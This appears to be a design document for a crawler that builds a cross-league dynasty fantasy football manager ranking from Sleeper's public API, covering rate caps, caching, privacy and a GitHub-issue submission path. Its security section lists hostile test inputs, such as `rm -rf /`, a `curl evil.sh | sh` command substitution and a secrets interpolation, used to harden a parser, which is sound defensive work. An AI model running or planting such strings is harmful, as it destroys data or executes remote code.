# Cross-league Manager Score: the corpus

How the "Best Dynasty Managers" board is built, what bounds it, and the two
constraints that must not be forgotten — **Sleeper's non-commercial licence**
and **the privacy of the people in it**.

---

## 1. The ask

> "anyone who inputs their data into the tool should be part of the analysis
> like this example: *'ranked against 340 managers across 28 dynasty leagues
> we've indexed'*"

and, specifically:

> "who are the best managers at drafting across every dynasty football league"

The per-league [Manager Score](../src/dynasty/managerscore.py) page cannot
answer either. It scores managers *within* one league, mean 100 and sd 15 by
construction — so the best manager in every league scores about 115, and two
such managers cannot be compared. Answering the question needs a **corpus**,
and a corpus needs a **crawl**.

---

## 2. Why this is a bounded crawl and never a census

Three hard constraints, all verified against the live API and Sleeper's own
published terms rather than assumed.

### 2.1 Sleeper cannot be enumerated

There is **no endpoint that lists leagues**. The API offers:

| You have | You can get |
|---|---|
| a league id | `GET /v1/league/{id}` |
| a league id | `GET /v1/league/{id}/users` |
| a user id | `GET /v1/user/{user_id}/leagues/nfl/{season}` |

League ids are 19-digit snowflakes (`1316222126914539520`). That id space
cannot be swept — it is sparse beyond any feasible probing, and probing it
would be abusive even if it were not.

So there is exactly **one** discovery path, the social graph:

```
league ──▶ /league/{id}/users ──▶ for each user
       ──▶ /user/{user_id}/leagues/nfl/{season} ──▶ their leagues
       ──▶ /league/{id}/users ──▶ ...
```

Every league in the corpus is therefore reachable only because somebody in an
already-known league also plays in it. **Coverage is a function of who we
happened to walk to, not of what exists.** The page says this in the banner,
not in a code comment.

### 2.2 The API is free for non-commercial use only

Sleeper's published terms, verbatim:

> The Sleeper API is a read-only HTTP API that is **free to use for
> non-commercial purposes** and allows access to a user's leagues, drafts, and
> rosters.
>
> **For commercial use of the Sleeper API, please reach out to us directly to
> discuss licensing.**

**This project is non-commercial, and this crawl is the single largest
consumer of that allowance in the repository.**

> ⚠️ **If Next Level Dynasty Football is ever monetised — ads, subscriptions, a paid
> tier, a sponsored placement, sale of the site or its data — this crawl
> needs a licensing conversation with Sleeper *before* the money starts.**
> It is the most licence-exposed thing here: it reads other people's leagues
> in volume and republishes a derived ranking of named handles. Do not assume
> the non-commercial allowance carries over. This paragraph exists so that
> whoever flips the commercial switch cannot claim nobody wrote it down.

### 2.3 Rate guidance

> Be mindful of the frequency of calls. A general rule is to stay **under 1000
> API calls per minute**, otherwise, you risk being IP-blocked.

The crawler runs nowhere near that ceiling, deliberately: a floor on the gap
between call starts (`--min-delay`, default 120 ms) and a concurrency cap of 3
in the scoring harness, giving roughly 4–8 calls/second. Being a good citizen
on a free read-only API costs nothing but wall time.

### 2.4 Therefore: explicit caps, always

| Cap | Flag | Daily job | What it bounds |
|---|---|---|---|
| Depth | `--max-hops` | 2 | hops out **per run**, from the current frontier |
| Scored | `--max-leagues` | 40 | leagues scored per run |
| Queued | `--max-discover` | 150 | new dynasty leagues added to the queue per run |
| Calls | `--max-calls` | 3000 | total Sleeper calls per run |
| Discovery | `--max-discovery-calls` | 300 | sub-cap so discovery cannot spend the run |
| Wall clock | `--max-seconds` | 1200 | how long a daily job may take |
| Pace | `--min-delay` | 0.15 s | minimum gap between call starts |
| Cache size | `--max-cache-mb` | 512 | stops *adding* to the cache; serving continues |

Three of these bound genuinely different risks and none can substitute for
another:

* `--max-calls` bounds **politeness** toward a free API.
* `--max-discovery-calls` bounds **breadth**. Discovery is cheap per call but
  unbounded in fan-out: every league leads to ~12 users and every user to all
  of their leagues. Without its own ceiling, a wide frontier spends the entire
  budget before a single league is scored — a crawl that discovers forever and
  indexes nothing.
* `--max-seconds` bounds **wall clock**, so a daily job stays daily even if
  Sleeper is slow.

Every run reports the budget it consumed, and the consumption is committed
into the artifact (`budget` block). `tests/test_crossleague.py` asserts the
caps remain configurable; `tests/test_crossleague_growth.py` asserts they are
*enforced*, by driving the call path 500 times against a cap of 7 and counting
how many times the transport was actually reached. That distinction matters:
"configurable" is a property of the interface, "cannot be exceeded" is a
property of the behaviour, and only the second one protects Sleeper.

### 2.5 Incremental: the crawl resumes rather than repeats

The first build of this corpus had a structural problem that no amount of
budget would have fixed. Each run started from the seed registry, walked two
hops, scored what it found, and threw away everything it had learned. The next
day it walked the same graph to the same five leagues and spent the same 600
calls. **The corpus could not grow, because it kept buying the same data.**

Two committed artifacts fix that.

`data/cross_league/crawl_state.json` (`dynasty.crawl_state`) holds:

* the **frontier** — leagues discovered but not yet expanded,
* the **examined sets** — leagues and users already walked, so they are never
  re-walked,
* the **scoring ledger** — which leagues have been scored, when, and whether
  it worked.

Hops are counted **per run from the current frontier**, not from the seeds. A
league parked at hop 2 today is expanded as a hop-0 entry tomorrow, so reach
grows by `--max-hops` every day instead of being permanently capped at
`--max-hops` from the seed — without ever issuing a large burst.

Scoring order is the other half. `plan_scoring` spends a reserved share of the
budget (`--new-league-share`, 0.7 in CI) on leagues **never scored before**,
then refreshes the stalest indexed ones with what is left. A run that spent
everything refreshing what it already had would be an expensive no-op.

Failures are recorded as attempts, not skipped. A permanently unreadable
league would otherwise sit at the front of the "never scored" queue and be
retried first on every single run — which is how a crawl gets stuck.

**Losing this file is survivable, and that is by design.** Every league ever
confirmed dynasty is *also* written to the seed registry (§9.2), so a cold
start re-reaches all of them at one call each. What is lost is the frontier:
reach into leagues found but not yet expanded. A cost, not a corruption.

### 2.6 The permanent cache: not paying twice

Discovery is cheap. Scoring is not. A single four-season dynasty chain costs
roughly:

```
4 x ( league + users + rosters + drafts + draft picks
      + 19 transaction weeks + up to 18 matchup weeks )  ~= 160 calls
```

Measured on the live API: **99 discovery calls found 500 dynasty leagues.**
Scoring those 500 would cost on the order of 80,000. Discovery was never the
bottleneck; re-scoring was.

So `scripts/js/sleeper_disk_cache.js` keeps completed seasons forever. One
rule decides what qualifies:

> A response is immutable **iff** the league season it belongs to is strictly
> older than the season Sleeper's own `/state/nfl` reports as current.

That is the same judgement the shipped page already makes — `knownPast` in
`msFetchTransactions` / `msFetchMatchups` marks exactly these responses
immutable in `sessionStorage`. This is that cache made durable and shared
across runs, not a second opinion about what is safe to keep.

It **fails closed** in every direction, because the dangerous failure here is
not a miss — it is a hit that should have been a miss, serving week-3 data in
week 14 while looking completely normal:

| Situation | Behaviour |
|---|---|
| `/state/nfl` unreadable | cache nothing — "current" is unknown |
| League season unknown | cache nothing for that league |
| Season ≥ current | cache nothing; never pin an in-progress season |
| Bundle on disk not strictly past | discarded on load, not served |
| Non-2xx response | not cached; one bad day must not become permanent |
| `/user/...`, `/state/nfl` | never cached; membership and the live week change |

The last row of the first block is what makes the **NFL season rollover** safe
with no migration: last year's "past" bundle becomes this year's "not strictly
past" and is dropped automatically.

**Layout.** `data/cross_league/cache/<league_id>.json.gz`, one bundle per
league *season* — a Sleeper league id is already season-scoped, since a
dynasty chain is a linked list of one league id per season, so the key
`(league_id, season, week)` collapses to `bundle(league_id) → entries[url]`.
The season is stored inside the bundle anyway, because a key you cannot audit
is a key you cannot trust. Draft picks carry no league in their URL, so
`cache/drafts.json` maps `draft_id → league_id`.

Raw response **text** is stored, never a re-serialised object, so what the
scorer parses on a hit is byte-identical to what it parsed on the miss.

**Ordering inside `instrumentedFetch` is load-bearing:**

```
local artifact  ->  disk cache  ->  budget check  ->  network
```

The cache is consulted *before* the budget. A league whose history is already
on disk must stay scorable when the budget is nearly spent, because serving it
costs Sleeper nothing. Swapping those two lines would make the cache useless
in exactly the situation it exists for, and it is the kind of change that
looks like tidying — so `tests/test_crossleague_growth.py` asserts the order.

A cache hit is **not** a call: it does not touch the network, does not consume
budget, and does not count toward the rate limit. It also must not set
`leagueRefused` — the harness discards any league that had a refused call, so
a hit that looked like a refusal would make the cache *shrink* the corpus.
That is asserted too.

**Size.** ~235 KB raw per past league-season, ~63 KB on disk gzipped
(measured: 55,468 bytes of real transaction + matchup JSON → 9,609, 5.8x).
Write-once and never rewritten. `--max-cache-mb` stops additions past a
ceiling while continuing to serve what is already there.

### 2.6.1 Why the cache is NOT committed

Every other durable artifact here is committed, so this one being gitignored
is a deliberate exception with two reasons:

1. **It is raw third-party data.** Caching Sleeper's responses to avoid
   hammering a free API is ordinary good behaviour. Committing ~24 MB of
   verbatim transaction logs and box scores into a public repository is
   republishing Sleeper's data, which is a different act, and one this
   project has no need to perform. §2.2 already commits us to treating their
   terms as a live constraint rather than a formality.
2. **It is regenerable, and losing it cannot cost a league.** The *scores*
   live in the `retained` block of `corpus.json`, which is committed. An
   evicted cache means one slower crawl, not a smaller corpus.

In CI it is restored by `actions/cache`, alongside `data/pfr_cache` and
`data/sr_cache`, which are gitignored for exactly the same reason. The daily
schedule keeps it inside the 7-day eviction window.

This is the one place where "the site is static, so a committed file is the
only durable storage" does **not** apply — because this artifact does not
need to be durable, only warm.

---

## 3. The dynasty filter: `settings.type == 2`

The corpus indexes dynasty leagues only. The discriminator is Sleeper's own
`settings.type` on the league object.

Sleeper's public docs describe the settings object **without enumerating this
field**, so the value was established **empirically against real league
objects**, not guessed:

| `settings.type` | Example league | `taxi_slots` | `max_keepers` | Reading |
|---|---|---|---|---|
| **2** | Dallas Kings | 3 | 1 | dynasty |
| **2** | DLD | 8 | 1 | dynasty |
| **2** | Game of Inches | 2 | 1 | dynasty |
| 1 | Playing For Keeps | 0 | 5 | keeper |
| 1 | Deke Dynasty | 0 | 18 | keeper |
| 0 | Stummy, The Megalabowl, MCIS | 0 | 1 | redraft |

The first real bounded run saw all three values across 13 leagues — 6 of
`type=2`, 2 of `type=1`, 5 of `type=0` — which is what makes the reading
solid rather than a two-case guess:

* **`type=2` is dynasty.** 4 of the 6 carried taxi squads; all had
  `max_keepers=1`, because a dynasty league keeps everyone and "keepers" is
  not the mechanism.
* **`type=1` is keeper.** Finite keeper counts (5 and 18), no taxi squad.
* **`type=0` is redraft.** No taxi squad, `max_keepers=1` — i.e. the field is
  simply unused, which is why `max_keepers` alone cannot separate redraft from
  dynasty and the `type` field itself has to be the discriminator.

Two consequences:

1. **Filter on `type == 2`.** Taxi squads and keeper counts are corroborating
   markers, not the test — 2 of the 6 dynasty leagues had no taxi squad, and
   `max_keepers=1` appears in both redraft and dynasty.
2. **Name matching would be wrong.** "Deke Dynasty" is `type=1` — a keeper
   league with 18 keepers. It plays a lot like dynasty, but Sleeper does not
   classify it as dynasty and neither do we. Indexing "what the platform calls
   a dynasty league" is a definition we do not have to defend; "leagues that
   feel dynasty-ish to us" is not. The cost is real: deep-keeper leagues that
   play like dynasty are excluded.

**This filter re-validates itself on every run.** `_filter_evidence()` in the
crawler recomputes the type-vs-markers table from the run's own data and
commits it into the artifact under `filter.observed_this_run`. If `type == 2`
ever stops meaning dynasty, it shows up there, on the run that saw it, rather
than rotting silently.

---

## 4. De-duplicating dynasty chains

A dynasty league is a *chain* of one league id per season, linked by
`previous_league_id`. The seed alone is four ids for one league:

```
2026 1316222126914539520
2025 1182068302871396352
2024 1048697508282695680
2023  970003719653826560
```

Counting those as four leagues would inflate coverage fourfold and count every
manager in them four times. Two mechanisms prevent it:

1. **Primary — the single-season invariant.** Discovery enumerates exactly one
   season. A chain holds exactly one league per season, so two *distinct
   same-season* league ids cannot belong to the same lineage. Prior seasons
   are never discovered as leagues at all; the scorer walks
   `previous_league_id` itself, so a league's history is *scored* without
   being *counted*.
2. **Safety net — `dedupe_lineages()`.** For the case the invariant does not
   cover (a hand-added seed that is a prior-season id of a league also
   discovered via its current-season head), lineages are collapsed on
   overlapping chain ids, keeping the entry with the longest chain — the one
   resting on the most evidence.

One league in the corpus can therefore carry several *league-seasons*, which
is why the artifact reports `n_leagues` and `n_league_seasons_scored`
separately.

---

## 5. Scoring: the same metric, not a second opinion

The per-league score is **not reimplemented** for the corpus.

The Manager Score maths, and the mapping from Sleeper's JSON into it, live
only in JavaScript — the page reads Sleeper live in the browser because the
site is a static GitHub Pages build with no server. Porting either to Python
would create a second implementation that immediately starts drifting.

Instead, `scripts/js/score_league_harness.js` runs the **shipped page
scripts** under node:

* `MANAGERSCORE_CORE_JS` + `MANAGERSCORE_UI_JS` are evaluated in a `vm`
  context, which makes every top-level declaration reachable — including the
  ones the UI layer does not export, `msFetchLeagueData`
  (`previous_league_id` chaining) and `msFetchTransactions` (per-week paging).
* `msBuildInput` → `msScoreLeague` are then called exactly as the page calls
  them.
* Three injections: a no-op `document` (so `msInit` never fires), a
  passthrough `console`, and an instrumented `fetch`.

`tests/test_crossleague.py` asserts the harness calls those functions by name
and contains no second copy of the maths.

`dynasty.crossleague.assert_scoring_constants_match()` additionally pins the
weights, shrink constants and index scale against the live
`MANAGERSCORE_CORE_JS` source. Change a weight in the per-league scorer and
the cross-league build **fails** rather than silently producing two different
metrics wearing one name.

### 5.1 Partial reads are discarded, never scored

`msGetJSONSoft()` turns any failed fetch into an empty fallback. That is right
for a browser — a league with no drafts legitimately 404s — and dangerous
here: a league whose transaction pages were refused mid-read would score
against half its history and *look* precise.

So a refused or failed call marks that league, and the orchestrator **throws
the whole league away**. A league is scored on all of its data or none of it.

---

## 6. The aggregation formula

For manager `m`, component `c` ∈ {draft, trade, waiver}:

```
N_c(m)    = Σ_leagues n_c(m, l)                  total scored events
zbar_c(m) = Σ_l n_c(m,l) · z_c(m,l) / N_c(m)     evidence-weighted mean
Z_c(m)    = zbar_c(m) · N_c(m) / (N_c(m) + K_c)  shrunk toward neutral

composite(m)  = Σ_c w_c · Z_c(m)      w renormalised over live components
crossIndex(m) = 100 + 15 · composite(m)
```

with `w = {draft 0.50, trade 0.35, waiver 0.15}` and
`K = {draft 6, trade 3, waiver 5}` — the merged scorer's own constants.

**Why a z-score is the right thing to carry across leagues.** It is already
normalised per league: "this far from your own league's average" is comparable
between a 10-team and a 14-team league in a way that raw KTC-point surplus is
not.

**Why evidence weighting.** A league where you made 30 picks counts ten times
one where you made three. Averaging leagues equally is the obvious
implementation and it is wrong — it lets one thin league swing a career.

**Why shrinkage twice, deliberately.** The per-league stage asks "how much
evidence *inside this league*?". This stage asks "how much evidence *across
the corpus*?". Different questions; someone with one draft in one league
should be pulled toward the middle by both. Both stages use the same
`n/(n+k)` form, so the guarantee the existing tests pin — shrinkage only ever
moves a manager *toward* neutral, never flips a sign, never overshoots — holds
end to end.

**Why the score is not re-centred on the corpus.** Re-standardising would make
every manager's number move whenever an unrelated league was indexed, which
makes a score impossible to quote or audit. The score is stable; the **rank**
carries the "against N managers" meaning. That is why `rank` and `percentile`
are first-class fields rather than something the page derives.

**The draft board has an entry requirement** (`MIN_DRAFT_PICKS_FOR_BOARD`,
default 6 = the draft shrink constant). Shrinkage alone still leaves a
one-pick manager *rankable*, and "best drafter" computed off one pick is not
an answer to the question that was asked. Gated managers stay on the main
leaderboard; they are excluded from the drafting board only.

---

## 7. Persistence, and what happens without write access

The site is static on GitHub Pages. **A browser cannot write to the corpus**,
so the corpus must be a committed artifact refreshed by the daily job:

```
data/cross_league/corpus.json     committed; grows run over run
dynasty_site/crossleague_corpus.json   published copy the page fetches
```

The daily workflow needs `contents: write` to commit it. **That permission is
already granted** in `.github/workflows/daily-refresh.yml` (it landed with the
merged Manager Score work, for the KTC history step) — but see §7.2: as of
this writing the write path has never actually executed, so it is granted in
configuration and **unproven in practice**.

The design therefore does not assume it works.

### 7.1 Two states, both correct

| State | What happens | What the page says |
|---|---|---|
| Corpus committed | `merge_corpus()` unions this run's crawl with leagues retained from previous runs. Coverage grows; leagues outside today's budget keep their last score rather than vanishing. | "Indexed since *date* over *N* daily runs; the corpus grows as each run reaches further into the league graph." |
| Not committed | Each run crawls from the seeds and ranks what it found. The feature works; it does not accumulate. | "Indexed in this build only — the corpus is not being retained between runs yet, so it does not grow day to day." |

Degradation needs no separate code path: no committed corpus simply means no
prior provenance to carry forward. `persisted` is `false`, `n_runs` is 1, and
both the artifact `notes` and the page banner say so. A corrupt or
schema-mismatched corpus is treated as absent (`load_corpus()` returns `None`
rather than raising), because a bad file must degrade the feature, not break
the daily build.

The site build never crawls. It copies the committed corpus into
`dynasty_site/` if one exists, and builds the page either way.

### 7.2 What is actually unproven

* **The repo-level Actions setting is unreadable with this token.** GitHub caps
  the workflow token at the repository/organisation "Workflow permissions"
  setting regardless of the YAML. `GET /repos/.../actions/permissions/workflow`
  returns **403** for the credential available here, so whether the setting is
  *Read and write* or *Read-only* could not be established. If it is
  read-only, the YAML grant is inert.
* **The existing write path has never run.** The `Retain KTC value history`
  step has succeeded on every recent run, but its log says
  `No new KTC value history to commit.` every time, and
  `data/consensus/history/` does not exist on `main`. The step is
  `continue-on-error`, so a failing `git push` would still report success.
  **No commit-back from this workflow has been observed to succeed.**

This is the same pending question that affects PR #63's KTC snapshots, and it
is a repository-settings question, not a code question. The corpus feature is
built to be correct either way, so it does not block on the answer.

---

## 8. Privacy and conduct

This board ranks real people who did not ask to be ranked. The rules are not
optional.

### 8.1 What is read

Only Sleeper's **public, read-only, unauthenticated** API — the same data any
visitor to a league page can see. No login, no credential, no private league
data. Sleeper: *"We do not perform authentication as our API is read-only and
only contains league information."*

### 8.2 What is stored about a person

**The Sleeper `display_name` and the opaque Sleeper `user_id`. Nothing else.**

`display_name` is the pseudonymous handle the user chose — `pjstiehl`,
`SimpsDontCry`. No real names, emails, avatars, team metadata or any other
identifying field reaches the artifact, and **no attempt is made anywhere in
this pipeline to resolve a handle to a real person.** Doing so is out of scope
permanently, not merely unimplemented.

`tests/test_crossleague.py::TestPrivacy` asserts the exact key set of a
leaderboard row and fails if `avatar`, `email`, `real_name`, `phone` or
`username` ever appear in the artifact.

### 8.3 No shaming board

**There is no "worst managers" board and there will not be one.** Boards are
ranked best-first; the tail is simply the tail. The renderer tests assert that
no "worst manager" / "shame" / "biggest loser" framing appears on the page.

The draft board's entry gate also protects the bottom of the table: a manager
with four scored picks is not held up as a bad drafter on that evidence.

### 8.4 Said in plain language, on the page

The page carries a "What is indexed, and why" section covering: that Sleeper
cannot be enumerated, that the corpus is a bounded sample and never a census,
what is read, what is stored about a person, that filtering is on Sleeper's
league type rather than the league's name, that there is no shaming board, and
that the API is non-commercial-use-only. In plain language, not jargon, and on
the page rather than only in this file — someone who finds themselves on this
board should be able to read what was measured without opening the repo.

### 8.5 Honest User-Agent

The crawler identifies itself:

```
Dynasty-Football-Model/cross-league-corpus
(+https://github.com/pstiehl/Dynasty-Football-Model)
```

This project does not spoof browsers to evade access controls — the same
position taken with Pro Football Reference in the daily workflow, where a 403
was accepted rather than worked around. The tests assert no `Mozilla/5.0`,
`Chrome/` or `Safari/` string appears in the crawler.

---

## 9. Running it

```bash
# cheap: discovery only, scores nothing, prints what it would index
python scripts/crawl_cross_league.py --discover-only

# a bounded real run
python scripts/crawl_cross_league.py --max-leagues 6 --max-calls 400 \
    --min-delay 0.25 --write-corpus

# what the daily job runs, publishing into a site build too
python scripts/crawl_cross_league.py --write-corpus --site-out dynasty_site
```

Seeds live in `data/cross_league/seeds.json`.

### 9.1 Why a separate registry, not `leagues.json`

`leagues.json` at the repo root is a **publishing manifest**: every entry
produces `dynasty_site/leagues/<platform>-<id>.json` and appears in the
`league.html` selector, and it exists mainly because MFL has no CORS and must
be baked in at build time.

The two files differ in every dimension that matters:

| | `leagues.json` | `data/cross_league/seeds.json` |
|---|---|---|
| Purpose | publish a league page | entry points for a crawl |
| Platforms | MFL + Sleeper | Sleeper only |
| Lifecycle | hand-curated, small | machine-extensible, grows |
| Consumer | `league.html` selector | the corpus crawler |
| Side effect of an entry | a published page + selector row | a few more API calls |

Adding crawl seeds to `leagues.json` would publish a per-league page for every
seed and pollute the league picker with leagues nobody on this site asked to
see. **Kept separate on purpose.**

### 9.2 The registry is the durable floor on coverage

`--update-seeds` writes every confirmed dynasty league back into the registry.
That is what makes coverage monotone: crawl state can be lost, corrupted,
reset or rolled over at a new season, and none of that costs a league, because
the registry is a hand-editable file that only an explicit edit shrinks.

Only leagues Sleeper itself confirmed as `settings.type == 2` are written, so
the registry cannot accumulate ids that every future crawl would discard.
Hand-written `note` fields and `_comment` keys are preserved on rewrite — an
operator's reason for adding a seed is not ours to overwrite.

---

## 9.5 Submissions: getting a league in from a static site

### 9.5.1 The honest problem

The owner's ask was that the board populate with "every league entered into
the tool". **On a static site, that cannot happen automatically, and no amount
of front-end work changes it.**

This site is a GitHub Pages build. Every page is a file. There is no server,
no database, no API of our own and no write path of any kind. When a visitor
types a league id into the Manager Score page, that id is read by JavaScript
in *their* browser, used to call Sleeper from *their* machine, and rendered
for *them*. Nothing about it reaches us — not in a log, not in a queue, not
anywhere. Adding a "submit your league" text box to the page would produce a
form that silently discards input, which is worse than not having one.

So the gap is closed as far as it genuinely can be, and the remainder is
stated rather than papered over.

### 9.5.2 What is implemented

The one inbox a static site can point an anonymous visitor at is a GitHub
issue, and the one writable store in the system is this repository — which the
daily workflow already writes to.

```
crossleague.html renders a link
  -> visitor opens a pre-filled issue form
  -> .github/workflows/league-submissions.yml fires on the `issues` event
  -> scripts/ingest_league_submissions.py reads open issues with the label
  -> validates the id against Sleeper
  -> appends to data/cross_league/seeds.json, comments, closes the issue
  -> the next daily crawl picks it up from the registry
```

The label is declared by the **issue template**, not by a `?labels=` query
parameter on the link. That parameter only works for users with write access
to the repository; for a visitor it is dropped or errors. Since the submitters
are by definition not collaborators, a template-declared label is the only
version that works — and the page test asserts the link uses `?template=`
rather than `?labels=`.

The ingest job is scheduled at 10:00 UTC and the crawl at 11:00, so a
submission accepted on the sweep is already in the registry when the crawl
runs.

### 9.5.3 Why this is safe

Issue bodies are attacker-controlled text from strangers, reaching a job that
holds a write-scoped token. Every item below is a deliberate property, and
each has a test in `tests/test_crossleague_growth.py`:

1. **Nothing from an issue is executed.** No shell, no `subprocess`, no
   `eval`, no template expansion. A test strips comments and string literals
   from the script and asserts none of those names appear in the remaining
   *code* — so the guarantee cannot be satisfied by a promise in a docstring.
2. **Only digits survive parsing.** `extract_league_id` is the entire trust
   boundary and may return exactly one thing: `^[0-9]{6,24}$`, or nothing.
   Tested against `123; rm -rf /`, `$(curl evil.sh | sh)`, backticks,
   `${{ secrets.GITHUB_TOKEN }}`, `<script>`, path traversal and SQL.
3. **Ambiguity is refused, not guessed.** Two candidate ids in one body is a
   rejection; picking one would make the outcome depend on text ordering the
   submitter did not know was significant.
4. **The id must be real.** Sleeper must return an existing league with
   `sport == nfl` and `settings.type == 2`. A well-formed id is not enough,
   and an unreachable Sleeper **fails closed**.
5. **Nothing else from the issue is stored.** The league's name comes from
   *Sleeper's* response, never the issue title or body, so a submitter cannot
   inject display text into the registry or the site.
6. **Bounded work.** `--max-issues 25` per run, one league id per issue.
7. **No injection sink in the workflow.** `${{ github.event.issue.body }}` is
   never interpolated into a `run:` block — that is the classic vulnerability
   in exactly this kind of workflow. The script reads the GitHub API itself,
   so no shell ever sees a submitter's string. Asserted against the YAML with
   comments stripped.
8. **Not `pull_request_target`.** That is the trigger that hands write-scoped
   credentials to a fork's code. `issues` events run from the default branch
   and check out no untrusted code.
9. **Least privilege.** `contents: write` and `issues: write`, nothing else,
   no secrets beyond the automatic `GITHUB_TOKEN`, and no dependency install —
   the script is stdlib-only, so no third-party code runs in a job holding
   that token.
10. **Accepting is not scoring.** An accepted id goes through the same crawl,
    the same dynasty filter and the same partial-read discard as any other
    league. A bad id that somehow got through yields no score, not a wrong one.
11. **Auditable and revertible.** `git log data/cross_league/seeds.json` shows
    every accepted id with the issue number that introduced it; removing one
    is a one-line revert.

### 9.5.4 The residual risk, stated rather than engineered around

Someone can submit a real dynasty league **they are not in**. No API can
distinguish that, so it is handled socially: the issue form says to submit
only your own league, the registry records which issue introduced it, and
removal is a revert. This is a limitation, not a solved problem.

### 9.5.5 What remains genuinely impossible

* **Automatic indexing from page use.** Typing a league id into the Manager
  Score page cannot add it here. That page runs in the visitor's browser and
  has no path to the corpus; only a job running in CI can write to it. A
  deliberate submission step is not a UX shortcoming, it is the boundary of
  what a static site is.
* **Instant indexing.** Submission is cheap; scoring is ~160 calls. A new
  league joins a queue and appears within a few daily runs.
* **Private leagues.** Sleeper's public API is all this reads. Anything it
  will not serve unauthenticated is not indexable, and this project will not
  authenticate to get around that.
* **A census of Sleeper.** Submissions widen the seed set, which is the *only*
  thing that reaches leagues outside the existing social neighbourhood — but
  the result is still a convenience sample, and the page says so.

---

## 10. Verification status

**Verified:**

* Dynasty filter value `settings.type == 2`, against real league objects
  spanning both dynasty and keeper leagues (§3), including the
  name-matching counter-example.
* All Sleeper response shapes the pipeline depends on, against the live API:
  league, `/users`, `/user/{id}/leagues/nfl/{season}`, `/drafts`,
  `/draft/{id}/picks`, `/transactions/{week}`.
* Sleeper's licensing and rate-limit terms, read from `docs.sleeper.com`.
* A real bounded end-to-end run: discovery, scoring via the shipped JS,
  aggregation and artifact write. **5 dynasty leagues, 56 managers, 21
  league-seasons, 526 API calls** (16 discovery + 510 scoring), 0 refused,
  0 network errors, against a 600-call cap.
* That compacting the retained block is lossless for aggregation: the
  leaderboard and draft board are byte-identical before and after, at 13x
  smaller (1.57 MB → 118 KB).

**Verified for the growth work (§2.5, §2.6, §9.5), all against the live API:**

* **Discovery is cheap, scoring is not.** One real discovery pass found
  **500 dynasty leagues in 99 calls** (~0.2 calls per league). Scoring those
  same leagues costs ~160 calls each. That asymmetry is the whole reason the
  crawl is incremental rather than just bigger.
* **Corpus growth, end to end.** 5 → **110 dynasty leagues**, 56 → **1,283
  managers**, 21 → **510 league-seasons**. 188 managers (15.4%) now appear in
  2+ indexed leagues, one in 33 — so cross-league aggregation has real
  cross-league evidence to work with rather than being an aggregation of one.
* **The permanent cache, measured twice.** Same four leagues, cold then warm:
  **313 calls / 66 s → 107 calls / 6.3 s** (66% fewer calls, 10x faster). At
  corpus scale a steady-state daily run scored 12 leagues in **22.6 s using
  316 calls while serving 2,012 cache hits free** — 2,328 logical reads for
  316 actual ones, an **86% reduction**.
* **Resumption across runs.** Run 1 scored 60 leagues and left 440 queued;
  run 2 resumed and planned "40 new + 60 refresh", ending at 100 scored /
  400 queued; run 3 resumed again to 109 scored / 391 queued. Each run
  continued the walk rather than repeating it, which is the behaviour the
  first build did not have.
* **The budget held every time.** Across all runs: **0 calls refused over
  budget, 0 network errors.** The largest run used 9,372 of a 9,600 cap.
  Pacing measured at ~430 calls/minute against Sleeper's published guidance
  of under 1,000.
* **The cache cannot serve an in-progress season.** Decision table asserted
  against fixtures in `tests/js/sleeper_cache_tests.js` (27 checks), including
  the season-rollover self-heal and the fail-closed paths.
* **Issue submissions cannot inject.** `extract_league_id` asserted against
  shell metacharacters, command substitution, backticks, workflow
  interpolation, `<script>`, path traversal and SQL; the workflow asserted to
  contain no `${{ github.event.issue.* }}` sink and no `pull_request_target`.

**Found and fixed while verifying — the actual "no data" bug:**

The harness served `managerscore_values.json` but not
`managerscore_series.json`. `msGetJSONSoft` turns a 404 into `null`, so
`MSX.series` was null on every crawl and `msCapture` answered "no value
  recorded on or before this date" for **every asset in every league**. The
crawl succeeded, every league scored, the artifact validated and the page
rendered — with every component at `n=0` and every manager at exactly index
100. Measured on one real league, before → after:

| | evaluable | tooRecent | offBoard | scores |
|---|---|---|---|---|
| before | **0** | 49 | 752 | all exactly 100 |
| after | **447** | 88 | 266 | 100.8 – 116.5 |

Corpus-wide the draft board went from **0 rows to 838**. Nothing failed
loudly, which is why it shipped: an empty corpus is shape-identical to a
corpus of very inactive leagues. The harness now **refuses to publish** when
the series is absent, and `tests/test_crossleague_growth.py` asserts both the
refusal and that the committed corpus contains at least one non-zero
component.
* Aggregation maths, lineage de-duplication, persistence degradation, coverage
  phrasing and the privacy key-set, by stdlib tests.
* Renderer behaviour and HTML escaping, in node against a stub DOM.
* Constant parity between the per-league scorer and the aggregator, including
  a tampered-fixture test proving the guard can actually fail.

**Not verified:**

* **Rendering.** There is no browser in the build environment. The page's
  *logic* is asserted against a stub DOM; how it **looks** is unconfirmed by
  eye. The coverage banner, the queue line and the submission link are
  asserted as strings and as DOM writes, never as pixels.
* **Whether the workflow can actually commit** (§7.2) — repo-level Actions
  permission is unreadable with the available token, and the existing
  commit-back path has never executed.
* **The submission path end to end.** Every part is tested against fixtures
  — parsing, validation, registry append, workflow shape — but **no real
  issue has been filed and ingested**. Doing so would require opening an
  issue on the live repository and letting a workflow that does not yet exist
  on `main` act on it. The first real submission is therefore the first live
  exercise of the label → ingest → commit → close loop.
* **Whether `actions/cache` retains the Sleeper cache in practice** (§2.6.1).
  The eviction behaviour is documented GitHub behaviour, not something
  observed here. If it does not hold, the cost reduction degrades toward the
  cold numbers; the corpus does not shrink.
* **Corpus representativeness.** A social-graph walk from one seed reaches
  leagues socially near that seed. The sample is not random and no claim is
  made that it is. Submissions are the only mechanism that can reach a
  disconnected part of the graph, and they depend on people choosing to use
  them.
* **That 400 queued leagues will ever be fully indexed.** At ~13 new leagues
  per daily run the current queue is roughly a month of crawling, assuming
  discovery adds nothing further — which it will.
